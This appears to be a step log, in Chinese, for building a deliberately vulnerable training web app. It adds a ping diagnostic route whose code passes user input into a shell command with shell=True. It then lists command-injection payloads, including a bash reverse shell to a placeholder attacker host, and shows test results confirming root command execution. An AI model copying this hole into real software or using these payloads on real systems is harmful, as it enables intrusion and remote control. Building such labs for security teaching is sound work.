# 步骤 20 — Ping 网络诊断功能 + 命令注入漏洞

> **新增功能:** Ping 网络诊断 `/ping`  
> **漏洞类型:** 命令注入（Command Injection）

---

## 一、新增功能

| 路由 | 方法 | 说明 |
|------|:----:|------|
| `/ping` | GET | 显示 Ping 测试页面 |
| `/ping` | POST | 执行 `ping -c 3 {ip}` 命令 |

### 修改的文件

| 文件 | 说明 |
|------|------|
| `app.py` | 新增 `/ping` 路由 + `subprocess` 导入 |
| `templates/ping.html` | **新增** Ping 测试页面（终端风格输出） |
| `templates/base.html` | 导航栏新增"Ping测试"链接 |
| `templates/index.html` | 首页新增"Ping测试"快捷入口 |

---

## 二、命令注入漏洞

### 漏洞代码

```python
cmd = f"ping -c 3 {ip}"
output = subprocess.check_output(cmd, shell=True, timeout=30)
```

用户输入的 `ip` 直接通过 f-string 拼入 shell 命令，且 `shell=True` 允许执行任意系统命令。

### 漏洞利用

```bash
# 注入执行 id 命令
ip=8.8.8.8; id

# 注入执行 ls
ip=127.0.0.1; ls -la

# 注入反弹 Shell
ip=127.0.0.1; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
```

### 测试结果

| 测试 | Payload | 结果 |
|------|---------|:----:|
| 正常 Ping | `8.8.8.8` | ✅ 显示 ping 结果 |
| 命令注入 | `8.8.8.8; echo PWNED; id` | ✅ 输出 PWNED + uid=0(root) |
| 命令注入 | `127.0.0.1; ls` | ✅ 命令执行成功 |
| 未登录保护 | — | ✅ 跳转登录页 |
